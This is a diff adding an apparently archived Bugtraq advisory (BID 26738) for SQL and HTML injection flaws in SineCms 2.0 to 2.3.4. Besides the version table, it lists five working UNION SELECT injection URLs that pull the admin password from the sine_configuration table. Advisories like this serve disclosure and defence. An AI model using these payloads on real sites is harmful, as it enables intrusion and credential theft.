@@ -1,0 +1,115 @@
+#SpeeDr00t@Black Falcon<br>#bid26738<p><b><span style="font-size: 18pt;">SineCms Multiple Input Validation Vulnerabilities</span></b></p><br><br><a href="http://www.securityfocus.com/bid/26738/info">info</a><br><a href="http://www.securityfocus.com/bid/26738/discuss">discussion</a><br><a href="http://www.securityfocus.com/bid/26738/exploit">exploit</a><br><a href="http://www.securityfocus.com/bid/26738/solution">solution</a><br><a href="http://www.securityfocus.com/bid/26738/references">references</a><br><br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+<table border="0" cellpadding="4" cellspacing="0">
+<tr>
+<td>
+<span class="label">Bugtraq ID:</span>
+</td>
+<td>
+				26738
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Class:</span>
+</td>
+<td>
+				Input Validation Error
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">CVE:</span>
+</td>
+<td>
+</td>
+</tr>
+<tr>
+<td>
+<span class="label">Remote:</span>
+</td>
+<td>
+				Yes
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Local:</span>
+</td>
+<td>
+				No
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Published:</span>
+</td>
+<td>
+				Dec 05 2007 12:00AM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Updated:</span>
+</td>
+<td>
+				Dec 19 2007 02:51PM
+			</td>
+</tr>
+<tr>
+<td>
+<span class="label">Credit:</span>
+</td>
+<td>
+				KiNgOfThEwOrLd is credited with the discovery of these vulnerabilities.
+			</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Vulnerable:</span>
+</td>
+<td>
+				
+					SineCms SineCms 2.3.4 <br/>
+					
+				
+					SineCms SineCms 2.3.2 <br/>
+					
+				
+					SineCms SineCms 2.2.1 <br/>
+					
+				
+					SineCms SineCms 2.1.1 <br/>
+					
+				
+					SineCms SineCms  2.2<br/>
+					
+				
+					SineCms SineCms  2.1<br/>
+					
+				
+					SineCms SineCms  2.0<br/>
+</td>
+</tr>
+<tr>
+<td colspan="2">
+<div class="breakline"></div>
+</td>
+</tr>
+<tr valign="top">
+<td>
+<span class="label">Not Vulnerable:</span>
+</td>
+<td>
+				
+					SineCms Calendar Module 2.2.3 <br/>
+</td>
+</tr>
+</table>
+</div><br><br>#<br>##no_exploit_link<br><br><br><br>#<br>#<div id="vulnerability">
+<span class="title"></span><br/><br/>
+	An attacker can exploit these issues via a browser.<br/><br/>The following SQL-injection examples were provided:<br/><br/>http://www.example.com/sinecms_path/mods.php?mods=Calendar&amp;amp;action=info&amp;amp;id='+union+select+1,password,3,4,5,6,7,8,9+from+sine_configuration/*<br/><br/>http://www.example.com/sinecms_path/admin/mods_adm.php?mods=Guestbook&amp;amp;action=modifica&amp;amp;id='+union+select+1,2,3,4,password,6+from+sine_configuration/*<br/><br/>http://www.example.com/sinecms_path/admin/mods_adm.php?mods=Calendar&amp;amp;mese=11'+union+select+1,password,3,4,5,6,7,8,9+from+sine_configuration/*<br/><br/>http://www.example.com/sinecms_path/admin/mods_adm.php?mods=Calendar&amp;amp;action=modify&amp;amp;id='+union+select+1,2,3,4,password,6,7,8,9+from+sine_configuration/*<br/><br/>http://www.example.com/sinecms_path/admin/mods_adm.php?mods=Calendar&amp;amp;anno='+union+select+1,password,3,4,5,6,7,8,9+from+sine_configuration/*<br/><br/>The attacker can exploit the HTML-injection vulnerabilities by submitting arbitrary HTML and script code.
+	
+		<ul>
+</ul>
+</div>
